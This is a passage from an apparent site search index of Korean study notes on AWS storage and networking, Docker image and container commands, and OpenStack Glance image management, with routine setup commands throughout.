ETL(Extract, Tranform, Load)  데이터를 추출하고, 변형하여, (Data Warehouse에) 적재하는 과정을 일컫는 말   BI(Business Intelligence)  데이터 추출/통합/리포팅을 위한 기본도구 집합, DW에서 분석된 데이터를 통해 숨겨진 패턴을 찾아냄 == \u0026gt; ETL을 통해 뽑아낸 데이터를 DW에 적재하고, BI를 이용하여 분석하는 기본 과정을 거침   Redshift vs RDS  Redshift는 보고 및 분석에 사용되지만, RDS는 OLTP(온라인 트랜잭션) 워크로드에 사용 Redshfit는 대용량 데이터 세트를 대상을 복합적인 분석 쿼리를 빠르게 실행하는 것에 목표를, RDS는 단일 행 트랜잭션에 목표를 둠    Amazon Aurora  클라우드에서 데이터베이스를 처음부터 설계하자는 생각에서 출발한 DB 서비스 MySQL과 PostgreSQl과 호환이 가능 각 AZ마다 2개의 데이터 복사본을 자동으로 유지하며, 에러를 스스로 찾아내고 복구 Read Replica는 다른 DB 서비스와 달리 최대 15개 까지 가능하며, 백업과 스냅샷이 퍼포먼스에 영향을 주지 않음    "});index.add({'id':46,'href':'/docs/cloudcomputing/awssaa/','title':"AWS SAA 시험정리",'content':" 정리 중\n"});index.add({'id':47,'href':'/docs/cloudcomputing/amazonwebservice/aws_storage/','title':"AWS Storage",'content':"AWS Storage   S3 ( Simple Storage Service )    웹 서비스 인터페이스( HTTP ) 를 이용하여 웹에서 언제 어디서나 원하는 양의 데이터를 저장하고 검색할 수 있는 스토리지 버킷( Bucket )과 객체 ( Object )로 나뉘며, 저장하고자 하는 모든 요소는 하나의 객체로 저장되고, 객체를 담는 곳이 버킷 S3 자체는 글로벌 서비스이지만 버킷을 생성 할 때에는 리전을 선택해야 함 객체는 객체 데이터와 메타 데이터로 나뉘며, 각자의 고유한 URL을 가지며 해당 URL로 접속 가능   버킷( Bucket )의 정의와 특징  객체를 담고 있는 구성 요소 크기는 무제한, 리전을 지정하여 버킷을 생성해야 함 버킷의 이름은 반드시 고유해야하며, 증복이 불가능 한번 설정된 버킷의 이름은 다른 계정에서 사용불가   객체( Object ) 의 정의와 특징  S3에 업로드되는 1개의 데이터를 객체라 함 키, 버전 ID, 값, 메타데이터 등으로 구성 객체 하나의 최소 크기는 1(0) byte ~ 5TB 스토리지 클래스, 암호화, 태그, 메타데이터, 객체 잠금 설정 가능 객체의 크기가 매우 클 경우 멀티파트 업로드를 통해 신속하게 업로드 가능   객체의 스토리지 클래스  객체의 접근빈도 및 저장기안에 따라 결정되는 객체의 특성 Standard Type : 클래스를 선택하지 않을 경우 선택되는 일반적인 클래스 Strandard_IA(Ifrequent Access ) : 자주 엑세스하지는 않지만 즉시 액세스할 수 있는 데이터여야하는 경우 선택되는 클래스 One Zone_iA : Standard_IA와 기능은 동일하나 Standard_IA의 경우 세 곳의 AZ에 저장되는 것과 달리 한 군데의 AZ에만 저장되어 해당 AZ가 파괴될 경우 정보 손실 가능성 존재 ( 저장 요금이 적음 ) Intelligent tiering : 엑세스 빈도가 불규칙하여 빈도를 가늠하기 어려운 경우 선택되는 클래스 Glancier : 검색이 아닌 저장이 주용도인 스토리지로 저장요금이 위 클래스들보다 훨씬 저렴한, 다만 저장이 주용도이기 때문에 검색이 3~ 5시간이 소요 Glacier Deep Archive : 10년 이상 저장할 데이터를 저장하는 스토리지 클래스   S3 사용  \rS3 생성\r↕\r\r S3 생성 1. S3를 선택합니다.  2. S3 사용을 위해 버킷을 생성합니다.  버킷 생성이 주의사항  버킷 이름에 대문자사용이 불가능 버킷 이름에 특수문자 사용 불가능 버킷 이름이 중첩될 수 없음 퍼블릭 엑세스 차단을 위한 버킷설정  S3 사용자의 설정에 따라 엑세스를 차단\u0026amp; 허용 설정이 가능     3. Bucket의 생성되었습니다.  4. 버킷을 선택하면 버킷을 사용할 수 있습니다.  5. 버킷의 파일을 사용자의 옵션에 맞춰 업로드합니다.  6. 업로드가 완료되었습니다.  7. 업로드 파일을 선택하면, 퍼블릭 전환, 다운로드 링크 등의 기능을 사용가능합니다.  8. 권한이 없는 사용자가 링크로 접근하면 다음과 같은 오류가 발생됩니다.   \r\r\r  윈도우 예약 작업과 S3 활용  \r윈도우 예약 작업과 S3 활용\r↕\r\r 윈도우 S3 연동  1. 연동을 위해 Bucket의 backup 폴더를 생성합니다.  2. 계정 생성을 위해 IAM 서비스로 이동합니다.  IAM이란   3. 사용자 추가를 선택하여 사용자의 옵션에 맞춰 새로운 사용자를 생성합니다.  4. 사용자 생성이 완료되었습니다. 사용자 생성 후, 연동을 위해 CLI를 설치합니다.  5. 설치가 완료되면, cmd 창에서 configure를 입력 후, 다운받은 csv파일의 정보들을 입력합니다.  AWS Access Key ID : ex.csv 파일의 엑세스 ID 값 AWS Secret Access Key :ex.csv 파일의 보안 엑세스 키 값 Default region name : region 이름으로 ap-northeast-2 입력 Default output format : 포맷 형식으로 json을 입력   6. aws s3 sync [ 저장한 윈도우의 경로 ] s3 [ 저장될 버킷의 경로 ]를 입력합니다. aws s3 sync c:\\backup s3://mybucketbucket/backup  7. 자동화를 위해 .bat 파일을 생성합니다.  8. bat 파일을 작업 스케줄러에 등록합니다.     9. 등록이 완료되었습니다. 확인을 위해 실행을 클릭합니다.  \r\r\r   Amazon EFS ( Elastic File System )    AWS 클라우드 서비스와 온프레미스 리소스에서 사용할 수 있는 탄력적인 완전 관리형 탄력적 NFS 파일 시스템 애플리케이션을 중단하지 않고 온디맨드 방식으로 구성 파일의 추가/ 제거 함에 따라 자동적으로 용량의 확장 및 축소 데이터 일관성 및 보안체계 제공 네트워크 파일 시스템( NFS v4 )를 사용하는 파일 스토리지 서비스 VPC 내에서 생성되며, 파일 시스템 인터페이스를 통해 EC2에 엑세스 수천 개의 EC2에서 동시에 엑세스 가능하며, 탄력적으로 파일을 추가하고 삭제함에 따라 자동으로 Auto Scaling 가능, 즉 미리 크기를 프로비저닝 할 필요가 없음 페타바이트단위 데이터까지 확장 가능 최대 1천개의 파일 시스템 생성   스토리지 클래스  Standard Class : 자주 액세스하는 파일을 저장하는 데 사용하는 클래스 Infrequent Access( IA ) Class : 저장기간이 길지만 자주 액세스하지 않는 파일을 저장하기 위한 클라스   가용성  여러 가용영역에서 엑세스 가능 여러 가용영역에 중복 저장되기 때문에 하나의 가용영역이 파괴되더라도 다른 AZ에서 서비스 제공 가능 IPSEC VPN 또는 Direct Connect를 통해 On-premise에서 접속 가능   성능 모드/ 처리량 모드  성능 모드에 있어서 대부분의 파일시스템에 Bursting Mode를 권장하지만 처리량이 많을 경우, Provisioned Mode를 권장   수명 주기 관리  Standard Class: 자주 액세스하는 클래스   파일시스템 정책  여러 가용영역에서 엑세스 가능 여러 가용영역에 중복 저장되기 때문에 하나의    Amazon Glacier    Glacier는 자주 사용하지 않는 데이터로 \u0026ldquo;Cold Data\u0026quot;에 최적화된 스토리지 서비스 데이터 보관 및 백업을 목적으로 보안 기능과 함께 내구성 있는 저장 공간을 제공하는 매우 저렴한 스토리지 서비스   Glacier의 종류  아카이브  Glacler에 데이터가 저장되는 최소 단위, 하나의 파일   볼트  Glacler에 생성할 수 있는 최상위 디렉토리, 볼트는 리전별로 생성해야 하며, 각 리전별로 최대 1000개까지 가능   볼트 인벤토리  볼트에 저장된 아카이브의 목록과 크기, 생성 날짜 등 아카이브 정보, 24시간에 한 번씩 업데이트      Storage Gateway    On-premise 환경에서 Cloud 상의 Storage를 지원할 수 있게 하는 하이브리드 스토리지 이름이 Storage ‘Gateway’인 이유는 Storage Gateway 자체가 스토리지의 역할을 하는 것이 아닌 스토리지( S3 )의 Gateway 역할을 하기 때문 Volume Gateway의 Stored Volume을 제외하고 나머지 유형은 EC2를 Gateway로 활용하여 Mount Point로 활용 가능 모든 Storage Gateway는 말 그대로 ‘Gateway‘를 생성해야 함  그 대상은 EC2 혹은 하드웨어 어플라이언스가 해당될 수 있음 EC2의 공인 IP를 Mount point로 지정하여 외부 네트워크에서 연결 가능   일반 PC에 마운트하여 사용하는 둥, 다양한 용도로 사용 가능   File Gateway  FNFS와 SMB를 지원하는 Storage Gateway 유형 S3를 스토리지로 사용하며, Gateway( EC2 등 )을 통해 S3에 데이터를 저장하고 이를 직접 S3에서 엑세스 할 수 있음 하나의 파일을 하나의 오브젝트로 관리됨 S3에 오브젝트로 관리되는 만큼, S3의 다른 기능을 사용할 수 있음   Volume Gateway  iSCSI를 지원하는 Storage Gateway 유형 두 가지 유형으로 나뉨  Cached Volume: S3를 기본 데이터 스토리로 사용하되, 자주 엑세스하는 데이터를 온프레미스 스토리지 게이트웨이의 캐시 및 업로드 버퍼 스토리지에 보관 Stored Volume: On-premise 스토리지를 기본 데이터 스토리지로 사용하고, 해당 데이터를 EBS Snapshot 형식으로 S3에 비동기 백업을 실시     Tape Gateway  VTL ( Vitual tape Library )를 지원하는 Storage Gateway 가상 테이프데이터는 S3나 S3 Glacier에 저장될 수 있음    EBS ( Elastic Block Stroe )    EBS 지원 EC2가 갖는 블록 형태의 스토리지 애플리케이션의 기본 스토리지로 쓰거나 시스템 드라이브용으로 쓰기 적합 인스턴스 생성 시 루트 디바이스 볼륨이 생성되며 사용 중에는 언마운트할 수 없음, 추가로 여러 볼륨의 마운트가 가능하며, 추가볼륨에 대해서는 사용중이라도 마운트/ 언마운트가 가능 EBS를 특정 AZ에서 생성하더라도 다른 AZ의 인스턴스에 즉시 붙일 수 있음 인스턴스 스토어 볼륨과는 달리 EBS 기반 인스턴스는 중지 / 재시작이 가능 사용중인 EBS더라도 볼륨 유형과 사이즈를 변경할 수 있음( 사이즈의 축소는 불가 )   EBS의 볼륨 유형  범용 SSD( gp2 ): 시스템 부트 사용 가능, 대부분의 워크로드에서 사용 프로비져닝된 IOPS SSD( io1 ): 지속적인 IOPS 성능이나 16.000 IOPS 이상의 볼륨당 처리량을 필요로 하는 경우 적합 ( DB 워크로드 ) 처리량 최적회돤 HDD( st1 ): 시스템 부트 사용 불가능, IOPS가 아닌 처리량을 기준으로 하며 자주 엑세스하는 워크로드에 적합한 저비용 HDD 볼륨, 빅데이터나 데이터 웨어 하우스에 사용 Cold HDD( sc1 ): 시스템 부트 사용 불가능, 자주 엑세스하지 않는 대용량 데이터 처리에 적합, 스토리지 비용이 최대한 낮아야 할 경우 사용   "});index.add({'id':48,'href':'/docs/cloudcomputing/docker/docker-3/','title':"Docker 이미지와 컨테이너",'content':"Docker 이미지와 컨테이너    Docker 이미지와 컨테이너    Docker 이미지  $ docker image --help\r$ docker image [ options ]\r   옵션 설명     build 이미지 빌드   history history 출력   inspect 임포트   load 로드   ls 이미지 리스트르 보여준다   prune 사용하지 않는 이미지를 제거   pull 저장소에서 이미지를 다운로드   push 저장소에 이미지를 업로드   rm 삭제   save tar로 이미지를 저장   tag 태그를 생성       $ docker pull [ options ] [ 레포지터리 : 태그 ]\r$ docker image pull [ options ] [ 레포지터리 : 태그 ]\r# 도커 이미지 다운로드\r$ docker images $ docker image list\r# 도커 이미지 리스트 리스트 출력\r$ docker image tags [ 기반이미지 : 태그 ] [ 새이미지 | 태그 ]\r# 도커 이미지에 태그 입력\r$ docker image push [ 레포지터리 : 태그 ]\r# 지정된 레포지터리에 업로드\r 도커 이미지의 태그는 버전을 구별하기 위한 역할을 수행합니다. 이미지에 태그를 부착하지 않을 경구 latest 태그가 부여됩니다.     Dockerfile 인스트럭션   Dockerfile을 사용하면 보다 쉽게 Docker 이미지를 생성할 수 있습니다.     옵션 설명     FROM 도커 이미지의 바탕이 될 베이스 이미지를 지정   RUN 도커 이미지를 실행할 때 컨테이너 안에서 실행할 명령을 정의하는 인스트럭션   COPY 도커가 동작중인 호스트 머신의 파일이나 디렉토리를 도커 컨테이너 안으로 복사하는 인스트럭션   CMD 도커 컨테이너를 실행할 때 컨테이너 안에서 실행할 프로세스를 지정, RUN은 빌드할 때마다 실행, CMD는 컨테이너를 시작할 때 한번만 실행 됨   ENTRYPOINT 컨테이너 명령 실행 방식을 조정할 수 있으며, CMD와 마찬가지로 컨테이너 안에서 실행할 프로세서를 지정하는 인스트럭션   LABEL 이미지를 만든 사람의 이름 등을 기입할 수 있음   ENV 도커 컨테이너 안에서 사용할 수 있는 환경변수를 지정   ARG 이미지를 빌드할 때 정보를 함께 넣기 위해 사용, 이미지를 빌드할 때만 사용할 수 있는 일시적인 환경변수       $ vi main.go\rpackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; ) func main() { http.HandleFunc(\u0026#34;/\u0026#34;, func(w http.ResponseWriter, r * http.Request){ log.Println(\u0026#34;received request\u0026#34;) fmt.Fprintf(w, \u0026#34;Hello Docker!!\u0026#34;) })\rlog.Println(\u0026#34;start server\u0026#34;) server: = \u0026amp; http.Server { Addr:\u0026#34;:8000\u0026#34; } if err: = server.ListenAndServe(); err != nil { log.Println(err) } }\r$ vi /root/docker/Dockerfile\rFROM golang:1.9 RUN mkdir /echo COPY main.go /echo CMD [\u0026#34;go\u0026#34;, \u0026#34;run\u0026#34;, \u0026#34;/echo/main.go\u0026#34;]\r# Dockerfile 생성\r$ docker build -t [ 이미지 이름 ] [ Dockerfile의 경로 ]\r$ docker build -t test:test .\r$ docker run --rm test:test\r# docker image 실행\r   $ docker container run -t -p 9000:8080 gihyodocker/echo:latest\r$ curl http:///localhost:9000/\r# 다른 터미널로 테스트\r   Docker 컨테이너   도커 컨테이너 생애주기  실행 중 상태 : Dockre container run 명령으로 이미지 기반 컨테이너를 생성한 상태 정지 상태 : 실핼 중 상태에 있는 컨테이너를 사용자가 명시적으로 정지하거나 컨테이너에 정상/ 오류 여부를 막론하고 종료된 경우 파기 상태 : 정지 상태의 컨테이너는 명시적으로 파기하지 않는 이상 디스크에 그대로 남음, 디스크를 차지하는 용량이 점점 늘어나므로 불필요한 컨테이너를 완전히 삭제하는 게 좋음       컨테이너 생성 및 실행 $ docker container run [ options ] [ 이미지명 : 태그 ] [ 명령 ] [ 명령인자 ]\r$ docker container run [ options ] [ 이미지 ID ] [ 명령 ] [ 명령인자 ]\r   옵션 설명     -d 옵션 백그라운드에서 실행   -p 옵션 포트포워딩   -it 옵션 /bin/sh로 쉘을 실행할 수 있음       컨테이너 이름 추가 $ docker container run --name [ 컨테이너 이름 ] [ 이미지명 | 태그 ]\r   옵션 설명     -i 옵션 컨테이너를 실행할 때 컨테이너 쪽 표준 입력과의 연결을 유지   -t 옵션 유사 터미널 기능을 활성화하는 옵션   \u0026ndash;rm 옵션 컨테이너를 종료할 때 컨테이너를 파기하도록 하는 옵션   -v 옵션 호스트와 컨테이너 간 디렉토리나 파일을 공유하기 위해 사용하는 옵션       컨테이너 정보 출력 $ docker container ls [ options ]\r# 도커 컨테이너 목록 출력\r$ docker container ls -q\r# ID만 출력\r$ docker container ls --filter \u0026#34; 필터명=값\u0026#34;\r# 컨테이너 목록 필터링\r$ docker container ls -a\r# 종료된 컨테이너 목록도 함께 출력\r   옵션 설명     CONTAINER ID 컨테이너 식별자   IMAGE 컨테이너를 만드는 데 사용된 도커 이미지   COMMAND 컨테이너에서 실행되는 어플리케이션 프로세스   CREATED 컨테이너 생성 후 경과된 시간   STATUS UP ( 실행 중 ), EXITED ( 종료 ) 등 컨테이너의 실행 상태   PORTS 호스트 포트와 컨테이너 포트의 연결 관계   NAME 컨테이너의 이름       컨테이너 상태변경 $ docker container stop\r# 컨테이너 징지\r$ docker container restart\r# 컨테이너 재시작\r$ docker container rm\r$ docker container run --rm\r# 컨테이너 삭제, 정지 시 삭제\r$ docekr container logs\r$ docker container logs [ options ] [ 컨테이너 ID 또는 컨테이너명 ]\r# 표준 출력 연결하기, -f 옵션을 통해 새로 출력되는 표준 출력 내용을 출력\r   컨테이너 내부에서 명령실행 $ docker container exec [ options ] [ 컨테이너 ID or 컨테이너 명 ] [ 컨테이너에서 실행할 명령 ]\r$ docker container cp [ options ] [ 컨테이너ip 또는 컨테이너 명 :원본파일] [ 대상파일 ]\r$ docker container cp [ options ] [ 호스트_원본파일 ] [ 컨테이너ID 또는 컨테이너명 : 대상 파일 ]\r   운영관리  $ docker image prune [ options ]\r# 태그가 붙지 않은 모든 이미지 삭제\r$ docker container prune [ options ]\r# 실행 중이 아닌 모든 컨테이너 삭제\r$ docker system prune\r# 사용하지 않는 모든 도커 리소스를 일괄적으로 삭제\r$ docker container stats [ options ] [ 대상 컨테이너 ID ]\r# 사용 현황 확인하기\r   컴포즈로 여러 컨테이너 실행하기   도커는 어플리케이션 배포에 특화된 컨테이너이다.    docker-compose 설치  $ sudo apt install -y docker-compose\r$ sudo yum install -y docker-compose\r# docker-compose 다운로드\r$ docker-compose run -d -p 9000:8080 example/echo:latest\r$ docker-compose.yml\r# docker-compose.yml 작성\r$ docker-compose up -d\r$ docker container ls\r# 실행 및 실행 확인\r$ docker-compose down\r# 컨테이너 정지\r  Jenkins Master-Slave  $ vi docker-compose.yml\r$ docker-compouse up -d\r$ docker container ls\r# 도커 컴포즈 실행\r$ cat jenkins_home/secrets/initialAdminPassword\r# 초기 Admin 암호\r http://localhost:8080/ 접속, 로그인 후 플러그인 설치, 사용자 생성                예제 1. 다음의 인스턴스를 생성해보세요.  \r예제 1. 답안\r↕\r\r 사용자 계정을 생성할 시, 엑세스 유형에서 프로그래밍 방식 엑세스만을 선택합니다. 정책에서 admin의 권한을 선택 후 생성합니다. \r\r\r\r "});index.add({'id':49,'href':'/docs/cloudcomputing/openstack/glance/','title':"Glance",'content':"이미지를 관리하는 서비스 : Glance   이미지를 관리하는 서비스 : Glance   Cloud Computing을 사용하기 위해서는 Virtual Machine을 생성하기 위한 이미지가 필요로 하며, Glance는 Nova에서 생성하는 인스턴스의 운영체제에 해당하는 이미지를 관리하는 서비스     Glance의 구성요소    Glance는 위의 그림과 같이 3가지의 구성요소로 이루어져 있다      구성요소 역할     Glance-api 이미지를 확인/ 복구/ 저장하는 등의 질의를 하기 이한 api 요청/ 응답을 담당   Glance-registry 이미지에 대한 메타데이터를 저장하고 처리하는 역할을 담당 및 Glance database에 저장된 데이터를 불러들이는 역할을 수행   Glance-database 이미지의 관련 정보들을 보관       논리 아키텍처의 Glance   Glance 사용자들은 glance-api로 이미지를 등록, 삭제, 관리 glance-api는 glance-registry와 Glance database에서 이미지를 관리 이미지를 등록할 때는 glance-registry로 Glance database에 저장 등록된 이미지를 사용할 때는 Glance database에 바로 사용을 요청 관리자는 운영하려는 운영체제의 이미지를 glance-registry로 Glance database에 등록     가상 머신 이미지 포맷   aki: 아마존 커널 이미지 ami: 아마존 머신 이미지 ari: 아마존 ram 디스크 이미지 iso: 광학 디스크나 CD-ROM의 데이터 콘텐츠를 지원하는 아카이브 포맷 qcow2: QEMU 에뮬레이터가 지원하는 포맷, 동적으로 확장할 수 있으며, Copy on Write를 지원 raw: 구조화되지 않은 디스크 포맷 vdi: VirtalBox 모니터와 QEMU 에뮬레이터가 지원하는 디스크 포맷 vhd: VHD 디스크 포맷은 VMware, Xen 마이크로소프트, VirtualBox 같은 가상 머신 모니터가 사용하는 일반적인 디스크 포맷 vhdx: VHDX 디스크 포맷은 큰 디스크 크기를 지원하는 VHD 형식의 향상된 버전 vmdk: 일반적인 디스크 포맷으로 여러 가상 머신 모니터가 지원     컨테이너 포맷(container Format)   aki: 아마존 커널 이미지 ami: 아마존 머신 이미지 bare: 아마존 ram 디스크 이미지 docker: Docker 컨테이너 포맷 ova: tar 파일의 OVF 패키지 ovf: OVF 컨테이너 포맷        Glance 명령어  현재 이미지 목록 확인  openstack image list\r  특정 이미지의 자세한 정보 확인  openstack image show [이미지 이름]\r  이미지 삭제  openstack image delete [이미지 이름]\r  이미지 추가  openstack image create --public --container-format bare --disk-format qcow2 --file [경로를 포함한 이미지 파일 이름] [이미지 이름]\r   커스텀 이미지 생성   xming 윈도우에 설치   CentOS 준비 후 CentOS에 가상머신 프로그램 설치 및 실행  $ yum install qemu kvm qemu-kvm libvirt virt-install bridge-utils virt-manager dejavu-lgc-sans-fonts virt-viewer\r$ systemctl restart libvirtd\r ISO 파일로 qcow2 각 이미지에 맞는 파일 생성  qemu-img create -f qcow2 [이미지 파일 위치] [이미지 파일 크기]\rqemu-img create -f qcow2 /test/centos7.qcow2 10G\r ISO로 가상머신 생성  $ virt-install --name centos \\\r--ram 1024 --disk \\\r[비어있는 이미지 파일 위치],format=qcow2 \\ --network network=default \\\r--graphics vnc,listen=0.0.0.0 \\\r--noautoconsole \\\r--os-type=linux \\\r--os-variant=centos7.0 \\\r--location=[ISO 위치]\r 본체 윈도우에서 putty x11 설정  Putty -\u0026gt; SSH -\u0026gt; X11 -\u0026gt; Enable X11 Forwarding 체크 -\u0026gt; X display location : localhost:0 설정 후 접속     virt-manager\r생성한 QEMU 가상머신 설정  SELINUX 끄기 acpid 설치 및 설정 cloud-init 및 cloud-utils 설치 및 설정 /etc/sysconfig/network qemu-guest-agent 설치 및 설정 grub 수정     생성한 가상머신에서 이미지 작업 ( 커스터 마이징 )   설치 후 설정  yum install -y /usr/bin/virt-sysprep virt-sysprep -d centos\t\u0026lt;-네트워크 장치의 MAC주소와 같은 정보를 삭제하는 작업 virsh undefine centos\t\u0026lt;-가상머신 삭제하는 작업    "});index.add({'id':50,'href':'/docs/programing/shell/shell-4/','title':"Shell 4",'content':"****    ****         #\n"});index.add({'id':51,'href':'/docs/cloudcomputing/amazonwebservice/aws_network/','title':"AWS Network",'content':"AWS Network   Amazon VPC ( Virtual Private Cloud )   AWS 상에 프라이빗 네트워크 공간을 구축할 수 있는 서비스 VPC를 이용하면 논리적인 네트워크 분리가 가능하고 라우팅 테이블과 각종 게이트웨이의 설정이 가능 AWS의 계정 전용 가상 네트워크 서비스 VPC 내에서 각종 리소스 ( EC2, RDS, ELB 등 )을 시작할 수 있으며 다른 가상 네트워크와 논리적으로 분리되어 있음 S3, Cloudfront 등은 다른 VPC 서비스로 VPC 내에서 생성되지 않음 각 Region 별로 VPC 가 다수 존재할 수 있음 VPC 하나의 사설 IP 대역을 보유하고, 서브넷을 생성하며 사설IP 대역 일부를 나누어 줄 수 있음 허용된 IP 블록 크기는 /16( IP 65536개 )- / 28 (IP 16개 ) 권고하는 VPC CIDR 블록 ( 사설 IP 대역과 동일 ) 10.0.0.0- 10.255.255.255( 10.0.0.0/8 ) 172.16.0.0- 172.31.255.255( 172.16.0.0/12 ) 192.168.0.0- 192.168.255.255( 192.168.0.0/16 )   Region  리전이란 AWS가 서비스를 제공하는 거점 ( 국가와 지역 )을 나타냅니다. 이는 모두 같은 방법 ( AWS 매니지먼트 콘솔, SDK, CLI )로 사용이 가능하며, 이를 통해 해외의 특정 서비스에 인프라 구축이 필요할 경우 큰 장점이 될 수 있음. AWS에서 사용하는 일종의 IDC의 집합으로 거의 모든 클라우드 서비스가 탑재되는 것으로 다수의 Availability Zone( 가용영역 )으로 구성됨 한 곳의 AZ의 기능이 마비되어도 다른 AZ가 기능을 수행 전 세계 주요 대도시에는 분포되어있음 AWS 사용자는 각 Region 마다 별도의 클라우드 망을 구축할 수 있음   Availability zone  가용 영역은 데이터 센터와 같은 의미라고 할 수 있습니다. 중국을 제외한 각각의 리전에는 2개 이상의 AZ가 존재하며, AWS 사용자가 원하는 AZ를 선택해서 시스템을 구축하는 것이 가능합니다. 즉, On Premise 구성으로 구현하기 힘든 여러 개의 데이터 센터를 사용한 시스템 구성 ( 한 국가 내부의 DR ) 구성 등을 쉽게 구현할 수 있습니다.   VPC Peering  VPC 간의 트래픽을 전송하기 위한 기능 Source VPC와 같은 / 다른 리전의 VPC를 Destination으로 선택하여 Peering 요청을 보낸 후, 수락시 Peering 가능 요청과 수락이 필요한 이유는 다른 계정의 VPC도 연결 가능하기 때문 Peering 생성 후 라우팅 테이블에 해당 peering을 집어넣으면 통신 시작 VPC peering은 Transit Routing 불가 ( 재가의 VPC가 하나의 VPC를 통해 통신하는 것 )   VPC Endpoint  VPC 내 요소들과 비 VPC 서비스( S3, CloudWatch, Athena 등 )을 외부인터넷을 거치지 않고 아마존 내부 백본 네트워크를 통해 연결하는 방법 그러므로 후술한 Direct Connect와 같은 전용선 서비스나 VPN, 인터넷 게이트웨이와 같은 외부 연결이 되어 있지 않는 서브넷에서 아마존의 여러 서비스를 연결가능 간단히 말하면 아마존 서비스 전용선 VPC 엔드포인트에는 Interface Endpoint, Gateway Endpoint 두 종류가 존재 Gateway Endpoint는 S3와 Dynamo DB만 가능   Subnet  VPC 내 생성된 분리된 네트워크로 하나의 서브넷은 하나의 AZ ( Avaiability Zone ) 에 연결 VPC가 가지고 있는 사설 IP 범위 내에서 ‘서브넷’을 쪼개어 사용가능 실직적으로 리소스들을 이 서브넷에서 생성이 되며 사설 IP를 기본적으로 할당받고 필요에 따라 공인 IP를 할당받음 하나의 서브넷은 하나의 라우팅 테이블과 하나의 NACL( Network ACL ) 을 가짐 서브넷에서 생성되는 리소스에 공인 IP 자동할당 여부를 설정할 수 있음 이 기능을 통해 Public Subnet과 Private Subnet을 만들어 커스터마이징 가능 서브넷 트래픽이 후술할 인터넷 게이트웨이로 라우팅이 되는 경우 해당 서브넷을 Public Subnet, 그렇지 않은 서브넷의 경우 Private Subnet이라 함 각 서브넷의 CIDR 블록에서 4개의 IP 주소와 마지막 IP 주소는 예약 주소로 사용자가 사용할 수 없음, 예를 들어 서브넷 주소가 172.16.1.0/24일 경우 172.16.1.0: 네트워크 주소 ( Network ID ) 172.16.1.1: VPC Router용 예약 주소 ( Gateway ) 172.16.1.2: DNS 서버의 IP주소 172.16.1.3: 향 후 사용할 예약 주소 172.16.1.255: 네트워크 브로드캐스트 주소   VPN ( Virtual Private Network )  AWS의 IPSEC VPN 서비스 이 VPN을 통해 AWS와 On-premise의 VPN을 연결하는 것이 가능 고객 측 공인 IP를 뜻하는 ‘Customer Gateway’와 AWS 측 게이트웨이인 ‘Virtual Private Gateway’ 생성 후 터널을 생성하면 사용 가능 반드시 VPC에서 VPN 터널 쪽으로 라우팅을 생성해야 함   Direct Connect  AWS의 데이터센터 및 오피스 네트워크와의 전용선 서비스 표준 이더네세 광섬유 케이블을 이용하여 케이블 한쪽을 사용자 내부 네트워크의 라우터에 연결하고 한 쪽을 Direct Connect 라우터에 연결하여 내부 네트워크 AWS VPC를 연결 보통 On-premise의 네트워크와 VPC를 연결할 때 사용 VPN보다 더 안전하고 빠른 속도를 보장 받고 싶을 때 사용 ( 백업 등 )   전용선 열결\n  VPC 사용한 Public Subnet\u0026amp; Private Subnet 생성 실습   Amazon CloudFront    .html, .css, .js 및 이미지 파일과 같은 정적 및 동적 웹 콘텐츠를 사용자에게 더 빨리 배포하도록 지원하는 웹 서비스 전 세계에 배치된 Edge location을 이용하여 효율적인 컨텐츠 배포 구조를 제공하는 것 Cloud Front는 HTTP/ HTTPS를 이용하여 S3 및 ELB, EC2, 외부 서버 등을 캐시하고 보다 빠른 속도로 콘텐츠를 전달하는 캐시 서버 Distribution은 Edge Location의 집합을 의미 Edge Location은 주변 Origin Server의 콘텐츠를 Edge Location에 캐싱하고 각 Edge Location 간 공유를 통해 콘텐츠를 전달 S3, ELB, EC2 등의 AWS 서비스뿐만 아니라 외부의 서버도 캐싱 가능 ( Custom Orgin ) TTL을 조절하여 캐시 주기를 통제할 수 있음    AWS Direct Connect   온 프레미스에서 AWS로 전용 네트워크 연결을 쉡게 설정할 수 있는 클라우드 서비스 솔루션 AWS와 사용자 데이터 센터, 사무실 등의 환경 사이에 프라이빗 연결이 가능   Direct Connect의 이점   대역폭 비용 감소\n 대역폭 사용량이 많은 워크로드를 AWS에서 실행하려는 경우, AWS에서는 데이터를 직접 송수신하므로, 인터넷 서비스의 대한 의존도를 줄일 수 있음 전용 연결을 통해 전송되는 데이터 요금은 인터넷 데이터 전송 요금이 ㅇ닌 보다 저렴한 AWS Direct Connect 데이터 전송 요금으로 부과되어짐    일관된 네트워크 성능\n 데이터와 데이터의 라우팅 방식이 선택되면 인터넷 기반 연결에서 효율적인 네트워크 환경의 제공이 가능    모든 AWS 서비스와 호환 가능\n AWS Direct Connect는 네트워크 서비스의 일종으로, 인터넷을 통해 액세스 할 수 있는 모든 AWS 서비스와 연동    AMAZON VPC로 프라이빗 연결\n AWS Direct Connect를 사용하여 온프레미스 네트워크에서 직접 Amazon VPC로 프라이빗 가상 인터페이스를 설정함으로써 네트워크와 VPC 간에 네트워크 연결을 제공할 수 있음 여러 가상 인터페이스를 사용하면 네트워크 격리를 유지하면서 여러 VPC 프라이빗 연결을 설정할 수 있음    탄력성\n AWS Direct Connect를 사용하면 요구 사항에 맞게 연결을 용량을 손쉽게 조정이 가능    간편성\n AWS Direct Connect는 직접 설치하는 것이 아닌, 설정하는 것으로 간편함      AWS Route 53    AWS의 DNS 서비스 ( 도메인 등록, DNS 라우팅, Health check ) 도메인 등록시 약 12.000원 정도 지불해야 하며, 최대 3일 정도 걸림 해당 도메인을 AWS 내 서비스 ( EC2, ELB, S3 등 ) 와 연결 할 수 있으며 AWS 외 요소들과도 연결 가능 도메인 생성 후 레코드 세트를 생성하여 하위 도메인을 등록할 수 있음 레코드 세트 등록시에는 IP 주소, 도메인, ‘Alias’ 등을 지정하여 쿼리를 라우팅할 수 있음 도메인 레지스트라 서비스를 통해 도메인 구매부터 정보 설정까지 Route 53으로 한번에 관리가 가능합니다. 장애 허용 아케텍처를 통해 시스템에 이상이 발생한 경우, 일시적으로 다른 서버로 전환하는 것이 가능합니다.   \rDNS\r↕\r\rDNS ( Domain Name System )   DNS란 도메인네임서버를 일컫으며, 인터넷은 서버들을 유일하게 구분할 수 있는 IP주소 체계를 보다 인간이 읽게 쉽게 하기 위해 계발되었다. 흔히 우리가 알고 있는 naver.com, google.com, daum.net 모두 DNS이다. AWS에서는 Route 53을 활용해 도메인 서비스를 지원한다. \r\r\r\r  Route 53의 라우팅 정책  Simple : 동일 레코드 내에 다수의 